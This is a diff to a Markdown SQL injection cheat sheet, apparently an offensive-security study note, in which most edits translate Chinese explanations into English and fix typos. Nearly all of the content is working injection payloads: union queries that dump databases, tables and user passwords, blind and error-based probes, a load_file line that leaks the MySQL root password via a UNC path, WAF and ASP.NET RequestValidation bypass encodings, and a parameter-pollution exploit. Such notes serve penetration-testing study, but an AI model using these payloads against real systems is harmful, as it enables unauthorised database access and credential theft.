@@ -34,7 +34,7 @@ rafael' or ''='    // select password from users where name = 'rafael' or ''='';
 ```  
 
 ### Union based
-1. Vul to SQL injection?  
+1. Vulnerable to SQL injection?  
 ```sql
 1' or 1"  
 ```  
@@ -43,46 +43,50 @@ rafael' or ''='    // select password from users where name = 'rafael' or ''='';
 // N+=1, until page cannot show
 1' order by N#
 ```  
-3. make sure where is our injection point?
+3. make sure the place of our injection point  
 ```sql
 //  1,2 number will show on the inj point 
 1' and 1=2 union select 1,2...N#
 ```  
-4. make sure some basic information
+4. make sure for some basic information  
 ```sql
 union select user(),database(),version(), @@version_compile_os--+
 ```  
-5. start our exciting point
+5. start our exciting part  
 ```sql
 ...union select 1,2,...,group_concat(schema_name) from information_schema.schemata--+  // get all database name
 ```  
+
 ```sql
 ...union select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema='FUCK'+--+  
 // table_schema can also show with hex
-```
+```  
+
 ```sql
 ...union select 1,2,...,group_concat(column_name) from information_schema.columns where table_name='users'+--+
 // table_schema would be better:)...
-```
+```  
+
 ```sql
 1' and 1=2 union 1,2,...,group_concat(username,password) from users+--+  
 // separate
-1' and 1=2 union select 1,group_concat(column_name separator '*') from table_name#    // with *
+1' and 1=2 union select 1,group_concat(column_name separator '*') from table_name#    // separate with *
 ```  
+
 [What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
-**group_concat() is also a litte trick.**
+**group_concat() is also a little trick.**
 
 ### Blind based  
-result not show on the page and also no error msg.  
-**True**: show normal.  
-**False**: show error or 0 result.  
+result is not showed on the page and there is also no any error message.  
+**True**: page shows normal.  
+**False**: page shows error or no any result.  
 **Boolean based**  
 ```sql
 length(str)
-substr(str,pos,len)   // start index from 1
+substr(str,pos,len)   // index starts from 1
 mid(str,pos,len)
 ascii(str)    // we will get decimal, ord()
-if(a,b,c)   // if a is true, return b, otherwise return c
+if(a,b,c)   // if a is true, it will return b, or otherwise return c
 id=1' and ascii(substr((select database()),1,1))>65--+  // ascii from 32~127
 // work with syntax
 and (mid((select group_concat(column_name) from information_schema.columns),1,1) like 'd');
@@ -138,44 +142,45 @@ select load_file( concat('\\\\', (select password from mysql.user where user='ro
 My payload: ?id = 2'
 Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''2'') LIMIT 0,1' at line 1
 ```
-看到**near**和**at**的字眼，我們可以刪除左右的單引號，剩下的sql語句應是: ```'  2'  ') LIMIT 0,1```  
-因此，注入語句應該是: ```') or 1=1--+```  
+When we see the word such like **near** and **at**，we can delete the single quote at the left side and right side. The left part should be: `'  2'  ') LIMIT 0,1`  
+Therefore，our exploit should be: `') or 1=1--+`  
 * Double injection
 ```sql
 /**
 we need:
-count()            // Important* 分組語句多要跟聚合語句配合才能回傳數據列
-concat()            // error會把碰撞的主鍵吐出來，因此我們需要把key跟查詢對象concat在一起
+count()            
+concat()            // the primary key which is collided would be showed in error message，so we should concat our target to the primary key
 floor(), rand()
 group by
 **/
 ?id = 1' union select count(*),1,concat((select database()),'~',floor(rand()*2))as a from information_schema.schemata group by a--+
-// 當我們清楚原理之後，也可以改成:
+// After we understand how it works completely，we can also modify our payload such like following:
 ?id = 1' or 1=1 group by concat(database(),floor(rand()*2)) having min(0)--+
-```
-```floor(rand()x2)``` 為穩定序列，造成```group by key```的碰撞! (非常推薦以下文章
-[The recommended aticle](http://dogewatch.github.io/2017/02/27/mysql-Error-Based-Injection/)  
-* Interger Overflow  
-```exp()```在sql版本大於5.5.5時才會有error  
+```  
+`floor(rand()x2)` has many same members in the list，and it causes to the collision of `group by key`! (I recommend the following article so much  
+  [The recommended aticle](http://dogewatch.github.io/2017/02/27/mysql-Error-Based-Injection/)  
+* Integer Overflow  
+`exp()` will cause to error when the version of sql is bigger than 5.5.5  
 ```sql
-exp(~(select*from(select user())a));  // 內部查詢結果為0, 經過逐位取反(~)後得到的是18446744073709551615,然而exp(710)就會溢出!
-// 後面的a ? 是alias, select*from 後再做子查詢需要給他別名
-```
-```select```回傳結果也可以用於計算，查詢成功->0，失敗->1 (非常重要!  
+exp(~(select*from(select user())a));  // the result of the query inside is 0, we will get 18446744073709551615 after the operation of (~), and exp(710) will cause to overflow!
+// What is the a at the end? It is alias. We need to assign an alias to subquery (select*from)
+```  
+
+`select` can also return the result of the query，it will return 0 if if the query is bigger than 0，and will return 1 if the result is 0 (very important!  
 [The recommended article](http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/)  
 * xpath syntax error  
-```extractvalue()```,```updatexml()```諸如此類函數可以對user指定xml語法做查詢語修改  
+`extractvalue()`,`updatexml()` can work on the xml syntax which is provided by the user  
 ```sql
 ?id=1" or/and select updatexml(1,concat(1,(select user()),0x7e),1);
 ?id=1" or/and select extractvalue(1,concat(1,(select database()),0x7e));
 ?id=1" or/and select extractvalue(rand(),concat(0x3a,@@basedir))#
-// 由於中間xml語法錯誤，會將database()結果顯示於錯誤訊息
+// Due to the error of xml syntax，database() will also show in the error message
 
 and extracvalue(rand(),concat(0x3a,(select schema_name from information_schema.schemata limit 0,1))#
 where table_schema=0xXXXXX
 
-// 奇技淫巧
-// 若注入點在limit後面 e.g. order by name limit {$_GET[1]}, 10
+// Some trick
+// If the injection point is after the word limit e.g. order by name limit {$_GET[1]}, 10
 ?1=select id from users where id>5 order by name limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
 // ERROR 1105 (HY000): XPATH syntax error: ':10.1.26-MariaDB'
 ```
@@ -209,29 +214,29 @@ Tricks:  
   - `unicode(left bracket): %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8`  
   - `unicode(right bracket): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9`  
   - `Char(49)` `Hex('a')` `Unhex(61)`  
-  - On asp+iis, server can parse unicode automatically, `%` in url would be ignored, it means `s%u0065lect` would be parsed as select  
+  - On asp+iis, server can parse the unicode automatically, `%` in url would be ignored, it means `s%u0065lect` would be parsed as 'select'  
   - `IBM037`,`IBM500`,`IBM1026`,`cp875` and so on, take a look at [bypass waf with encoding](#bypass-requestvalidation-on-aspx)  
 - Comment 
   - `#`    
   - `--+` `--` `-- -`  
   - `/* ... */` `///**/`(multiple lines)  
   - {backtick} can be used as comment if  mysql <= 5.5  
-  - `;` stacking queries cannot be used in mysql query+php, but works in PDO  
+  - `;` stacking queries cannot be used in mysql query+php, but it works in PDO  
 - Command bypass  
   - `sleep()` -> `benchmark()`  
   - `@@datadir` -> `datadir()`  
 - Logic operator  
   - `and/or` -> `&& / |`  
-- Wide char  
+- Wide-Character injection  
   - bypass single quote： `%bf%27 %df%27 %aa%27`  
-- `information_schema` bypass  
+- keyword `information_schema` bypass  
   - get database name：`select * from users where name = helloworld();`  
     `ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`  
 - HPP on asp  
-  - When GET/POST/COOKIE submit `uid` at the same time, server would follow GET/POST/COOKIE to receive and split them with comma  
+  - When GET/POST/COOKIE submit `uid` at the same time, server would follow the order of GET/POST/COOKIE to receive and split them with comma  
   - Exploit: `http://example.com/?uid=1 and 1=2 union/*  POST: uid=*/select.....`  
 - Function separator  
-  - In fact, there can be someting between func name and left bracket, this can be used to bypass regex  
+  - In fact, there can be something between function name and the left bracket, this can be used to bypass regex  
   - function `/**/`,`%2520`,`%250c`,`%25a0` ()  
 
 More：  
@@ -293,16 +298,16 @@ mysql setting of `--secure_file_priv` limit the path of writting files, with `se
 
 ### Bypass RequestValidation on ASPX
 ![image](https://farm2.staticflickr.com/1829/43302939171_78fbb87eba_h.jpg)  
-Request Validation是ASP上檢查request是否含有惡意內容的機制，預設連HTML的一般MARKUP也會阻擋，因此可以客製化Request Validation，或者直接手動檢查  
-從上圖得知大多數的伺服器支援IBM037,IBM500,IBM1026,cp875的字集，下面的code可以得到encoded string  
+Request Validation is the mechanism of ASP to check the malicious request，and it defaults to block even the common html tag，but we can customize the rules of Request Validation or check by ourselves  
+From the image above, we can find that many server support IBM037,IBM500,IBM1026,cp875，we can get the encoded string with following script  
 ```python
 import urllib
 payload = 'xxx'
 print urllib.quote_plus(payload.encode("IBM500"))
 ```  
-以`QueryString`的利用方式為例，他負責接收來自GET的參數  
+Take `QueryString` for example，he can receive the GET parameter from request  
 ```php
-// Appsec Europe的一個sqlinj挑戰
+// Appsec Europe sqlinj challenge
 On Error Resume Next
 
 If Not Request.QueryString("uid").Contains("'") Then
@@ -312,7 +317,7 @@ Else
   Response.Write("You fail")
 End If
 ```
-很明顯的，這個sql inj禁止單引號，可是我們需要他來做閉合...  
+Apparently，this challenge prevent us from injecting with single quote，but how can we close the single quote to achieve injection...  
 ![](https://farm1.staticflickr.com/921/42585039264_b5874cc629_h.jpg)  
 Exploit:  
 第一次`QueryString`時發生了error，但卻因為`On Error Resume Next`而繼續執行下去，第二次`QueryString`時就通過了，這還需要切換Request Method  
